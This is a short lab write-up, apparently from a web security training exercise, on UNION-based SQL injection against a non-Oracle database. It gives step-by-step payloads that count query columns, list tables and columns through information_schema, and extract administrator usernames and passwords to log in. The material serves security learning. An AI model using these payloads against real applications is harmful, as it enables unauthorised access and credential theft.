<img width="600" height="300" alt="Screenshot_6" src="https://github.com/user-attachments/assets/803c5a2b-6a9f-4513-b600-bc54c7274256" />
<img width="600" height="300" alt="Screenshot_7" src="https://github.com/user-attachments/assets/2da7c795-ad33-44db-bec4-0682a5095782" />
<img width="600" height="300" alt="Screenshot_8" src="https://github.com/user-attachments/assets/9f2efe06-b87e-41db-afb2-7794987f819c" />
<img width="600" height="300" alt="Screenshot_9" src="https://github.com/user-attachments/assets/314162d3-9c59-4d43-8d1b-2a05c9dae6e4" />


# Lab: SQL Injection Attack – Listing the Database Contents (Non-Oracle)

## 📝 Lab Summary
This lab involves exploiting a **SQL injection vulnerability** to enumerate database contents on a **non-Oracle** system.  
The goal is to extract the **username and password** of the administrator user and use them to log in.

---

## 🔑 Key Concepts Used
- **Finding the number of columns** via `UNION SELECT null,...`
- **Database schema enumeration** with `information_schema.tables` and `information_schema.columns`
- **Filtering results with WHERE clause**
- **Extracting credentials from an interesting table**

---

## 🚀 Step-by-Step Exploitation

### 1. Determine the number of columns
Inject into a vulnerable parameter with:
- ' UNION SELECT null, null--
     If successful → confirms 2 columns in the original query.
### 2. Enumerate all available tables

Query information_schema.tables to list tables:
- ' UNION SELECT table_name, null FROM information_schema.tables-- Look through the output for something interesting, usually a users table.
### 3. Enumerate columns of the chosen table
Query information_schema.columns for the users table:
' UNION SELECT column_name, null 
  FROM information_schema.columns 
  WHERE table_name='users'--
##### Typical results:
- username
- password
### 4. Extract usernames and passwords
' UNION SELECT username, password FROM users--
Among the results, locate the administrator credentials.
### 5. Use credentials to log in
Take the extracted administrator username and password, then authenticate through the application’s login page.


